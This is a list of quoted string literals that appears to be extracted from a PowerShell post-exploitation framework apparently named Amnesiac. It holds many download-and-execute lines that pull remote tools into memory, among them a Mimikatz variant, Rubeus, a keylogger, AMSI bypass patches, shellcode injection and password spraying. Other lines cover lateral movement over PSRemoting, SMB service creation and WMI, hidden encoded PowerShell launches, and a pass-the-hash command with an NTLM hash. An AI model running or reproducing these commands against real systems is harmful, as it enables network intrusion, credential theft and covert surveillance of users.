"""\\$ComputerName create $ServiceName binpath= `"
"""\\$ComputerName delete $ServiceName"
"""\\$ComputerName start $ServiceName"
"""\\$ComputerName\ROOT\CIMV2:$ClassID"
"""\\$ComputerName\root\cimv2"
"""\\$Target create $ServiceName binpath= `"
"""\\$Target start $ServiceName"
"""\\$TargetServer delete $serviceToDelete"
"""\\`$TargetServer delete `$serviceToDelete"
"""\s+"
"""\s+\d+\.\d+\.\d+\.\d+:\d+\s+"
"""\x00`"
"""^172\.(1[6-9]|2[0-9]|3[0-1])\."
"""^\[!\] Process running with"
"""^\[\+] Sucessfully injected the shellcode into"
"""_"
"""__CLASS"
"""`"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$ShCodePlaceholder = `"
"""`$c 2>&1|Out-String`"
"""`$command 2>&1 | Out-String"
"""`$env:COMPUTERNAME,`$(Get-Location)"
"""`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`"
"""`$job = Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob"
"""`$job | Wait-Job;`$job | Remove-Job"
"""`$outputData = &$commandStr | Out-String; Get-WmiObject -Class $ClassID -Filter `"
"""`$p=New-Object System.IO.Pipes.NamedPipeClientStream("
"""`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine("
"""`$process = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep Bypass', '-enc $encCommand' -PassThru;`$processId = `$process.Id"
"""`$pwd\$remotefileName`"
"""`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier "
"""`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"
"""`$trimmedShCodePlaceholder = `$ShCodePlaceholder.Trim();PInject /t:1 /f:hex /pid:$InjectPID /sc:`$trimmedShCodePlaceholder /enc:AES"
"""`\`"
"""`n"
"""`n$"
"""`nFile-Server -Port $userdefPort -Path $userdefPath"
"""`n`"
"""`r?`n"
"""`r?`n`"
"""ababcdcdefefghgh"
"""c:\Users\Public\Documents\Amnesiac\Clipboard"
"""c:\Users\Public\Documents\Amnesiac\Downloads"
"""c:\Users\Public\Documents\Amnesiac\History"
"""c:\Users\Public\Documents\Amnesiac\Keylogger"
"""c:\Users\Public\Documents\Amnesiac\Monitor_TGTs"
"""c:\Users\Public\Documents\Amnesiac\Screenshots"
"""c:\Users\Public\Documents\Amnesiac\Scripts"
"""c:\Users\Public\Documents\LocalAdminAccess.txt"
"""c:\Users\Public\Documents\`$(`$env:USERNAME)log.txt`"
"""comma_separated_Targets`"
"""create $ServiceName binpath= `"
"""dNSHostName"
"""delete $serviceToDelete"
"""dummyhostdropconnection,`$(Get-Location)`"
"""exit"
"""exit`"
"""ferrari.local`"
"""ferrari\Administrator`"
"""has Local Admin access on"
"""help"
"""history"
"""http://$($DefineHostname):$userdefPort"
"""https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ask4Creds.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');Write-Output '';Write-Output '[+] Rubeus Loaded | https://github.com/GhostPack/Rubeus';Write-Output '';Write-Output '[+] Usage: Rubeus <command>';Write-Output '';Write-Output '    Rubeus createnetonly /program:c:\windows\system32\cmd.exe /domain: /dc: /username: /password:fakepass /ptt /ticket:'"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Find-LocalAdminAccess.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-Patamenia.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SMBRemoting.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-WMIRemoting.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SessionHunter.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1');Write-Output '';Write-Output '[+] .NET Patched'"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1');Write-Output '';Write-Output '[+] PInject Loaded | https://github.com/3xpl01tc0d3r/ProcessInjection';Write-Output '';Write-Output '[+] Usage: PInject <pid> <shellcode_in_hex_format>';Write-Output '';Write-Output '[+] Tip: How to generate your hex shell code:';Write-Output '';Write-Output '    ShellGen powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=';Write-Output '';Write-Output '    msfvenom -p windows/x64/exec CMD=`"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PassSpray.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');Write-Output '';Write-Output '[+] Patched'"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/klg.ps1');KeyLog -logfile `"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Suntour.ps1');Write-Output '';Write-Output '[+] Mimi Loaded | https://blog.gentilkiwi.com';Write-Output '';Write-Output '[+] Usage: Mimi -Command ''`"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Sync.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -Clear"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -EncryptionKey `"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -Timeout 86400 -EncryptionKey `"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Token-Impersonation.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Tkn_Access_Check.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Validate-Credentials.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/cms.ps1');Enum-Creds"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/pwv.ps1');Write-Output '';Write-Output '[+] PowerView Loaded | https://github.com/PowerShellMafia/PowerSploit'"
"""is not running"
"""log.txt"
"""name"
"""nt authority\system"
"""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "
"""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $base64Input"
"""powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript"
"""powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"
"""powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"
"""powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=`"
"""powershell.exe"
"""prompt | Out-String"
"""root\cimv2"
"""screen4K"
"""screenshot"
"""sekurlsa::pth /user:Administrator /domain:ferrari.local /ntlm:217E50203A5ABA59CEFA863C724BF61B`"
"""shell_psadmin*"
"""shell_smbadmin*"
"""shell_tknadmin*"
"""shell_wmiadmin*"
"""start $ServiceName"
"""sync"
"""trustAttributes"
"""trustDirection"
"""trustPartner"
"""trustType"
"""trustattributes"
"""trustdirection"
"""trusttype"
"""try{type c:\Users\Public\Documents\$ConstructFileName | Out-String -Width 4096}catch{}#"
"""try{type c:\Users\Public\Documents\RDP_log.txt | Out-String -Width 4096}catch{}#"
"""whenChanged"
"""whenCreated"
"""whoami /all`"
"""whoami"
"""|"
"""|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"
"""|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"
"""};Get-Process -IncludeUserName | Where-Object { $_.Id -eq $PID } | Select ID, ProcessName, SessionId, UserName, Path | Sort ID | Format-Table -AutoSize | Out-String -Width 4096}else{Write-Output "
"""};Write-Output "
"""}else{Write-Output "
